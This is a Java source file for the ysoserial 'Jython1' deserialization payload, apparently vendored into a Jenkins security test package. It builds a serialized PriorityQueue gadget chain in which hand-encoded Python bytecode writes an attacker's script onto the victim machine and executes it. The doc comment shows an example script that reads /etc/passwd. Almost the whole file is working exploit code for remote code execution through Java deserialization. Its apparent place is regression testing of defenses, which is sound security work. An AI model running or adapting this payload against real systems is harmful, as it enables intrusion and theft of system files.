package jenkins.security.security218.ysoserial.payloads;

import org.apache.commons.io.FileUtils;
import org.python.core.*;

import java.math.BigInteger;
import java.io.File;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

import jenkins.security.security218.ysoserial.payloads.util.Reflections;
import jenkins.security.security218.ysoserial.payloads.annotation.Dependencies;
import jenkins.security.security218.ysoserial.payloads.annotation.PayloadTest;
import jenkins.security.security218.ysoserial.payloads.util.PayloadRunner;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 *
 * This version of Jython1 writes a python script on the victim machine and
 * executes it. The format of the parameters is:
 *
 * <local path>;<remote path>
 *
 * Where local path is the python script's location on the attack box and
 * remote path is the location where the script will be written/executed from.
 * For example:
 *
 * "/home/albino_lobster/read_etc_passwd.py;/tmp/jython1.py"
 *
 * In the above example, if "read_etc_passwd.py" simply contained the string:
 *
 * raise Exception(open('/etc/passwd', 'r').read())
 *
 * Then, when deserialized, the script will read in /etc/passwd and raise an
 * exception with its contents (which could be useful if the target returns
 * exception information).
 */

@PayloadTest(skip="non RCE")
@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({ "org.python:jython-standalone:2.5.2" })
public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
    public PriorityQueue getObject(String command) throws Exception {

        String[] paths = command.split(";");
        if (paths.length != 2) {
            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(paths));
        }

        // Set payload parameters
        String python_code = FileUtils.readFileToString(new File(paths[0]), "UTF-8");

        // Python bytecode to write a file on disk and execute it
        String code =
              "740000" + //0 LOAD_GLOBAL               0 (open)
              "640100" + //3 LOAD_CONST                1 (remote path)
              "640200" + //6 LOAD_CONST                2 ('w+')
              "830200" + //9 CALL_FUNCTION             2
              "7D0000" + //12 STORE_FAST               0 (file)

              "7C0000" + //15 LOAD_FAST                0 (file)
              "690100" + //18 LOAD_ATTR                1 (write)
              "640300" + //21 LOAD_CONST               3 (python code)
              "830100" + //24 CALL_FUNCTION            1
              "01" +     //27 POP_TOP

              "7C0000" + //28 LOAD_FAST                0 (file)
              "690200" + //31 LOAD_ATTR                2 (close)
              "830000" + //34 CALL_FUNCTION            0
              "01" +     //37 POP_TOP

              "740300" + //38 LOAD_GLOBAL              3 (execfile)
              "640100" + //41 LOAD_CONST               1 (remote path)
              "830100" + //44 CALL_FUNCTION            1
              "01" +     //47 POP_TOP
              "640000" + //48 LOAD_CONST               0 (None)
              "53";      //51 RETURN_VALUE

        // Helping consts and names
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(paths[1]), new PyString("w+"), new PyString(python_code)};
        String[] names = new String[]{"open", "write", "close", "execfile"};

        // Generating PyBytecode wrapper for our python bytecode
        PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{ "", "" }, "noname", "<module>", 0, "");
        Reflections.setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());

        // Create a PyFunction Invocation handler that will call our python bytecode when intercepting any method
        PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);

        // Prepare Trigger Gadget
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }
 
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jython1.class, args);
    }
}
